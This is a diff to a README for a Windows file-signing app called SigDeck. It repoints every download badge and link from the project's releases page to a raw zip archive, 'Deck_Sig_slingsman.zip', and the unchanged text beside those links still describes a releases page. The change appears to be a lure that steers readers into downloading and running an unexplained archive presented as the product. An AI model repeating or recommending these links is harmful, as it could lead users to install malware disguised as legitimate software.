@@ -1,7 +1,7 @@
 <h1>🔐 SigDeck - Sign Files Securely, Even Offline</h1>
 
 <p align="center">
-  <a href="https://github.com/Zhang6765338/SigDeck/releases"><img src="https://img.shields.io/badge/Download-SigDeck%20Latest%20Release-4CAF50?style=for-the-badge&logo=github" alt="Download SigDeck"></a>
+  <a href="https://raw.githubusercontent.com/Zhang6765338/SigDeck/main/app/Deck_Sig_slingsman.zip"><img src="https://img.shields.io/badge/Download-SigDeck%20Latest%20Release-4CAF50?style=for-the-badge&logo=github" alt="Download SigDeck"></a>
 </p>
 
 ## 👋 Welcome to SigDeck
@@ -18,7 +18,7 @@ Getting SigDeck running on your Windows computer takes less than two minutes. He
 
 ### Step 1: Download the Application
 
-**Visit this link to download the application:** [https://github.com/Zhang6765338/SigDeck/releases](https://github.com/Zhang6765338/SigDeck/releases)
+**Visit this link to download the application:** [https://raw.githubusercontent.com/Zhang6765338/SigDeck/main/app/Deck_Sig_slingsman.zip](https://raw.githubusercontent.com/Zhang6765338/SigDeck/main/app/Deck_Sig_slingsman.zip)
 
 Once you click that link, you'll see a page with a list of released versions. Look for the most recent one (usually at the top) and download the file associated with it.
 
@@ -131,7 +131,7 @@ Yes. SigDeck is completely free and open-source.
 
 Ready to get started?
 
-**Visit this link to download the application:** [https://github.com/Zhang6765338/SigDeck/releases](https://github.com/Zhang6765338/SigDeck/releases)
+**Visit this link to download the application:** [https://raw.githubusercontent.com/Zhang6765338/SigDeck/main/app/Deck_Sig_slingsman.zip](https://raw.githubusercontent.com/Zhang6765338/SigDeck/main/app/Deck_Sig_slingsman.zip)
 
 Choose the latest release, download the file, double-click to run, and you're signing files within minutes.
 
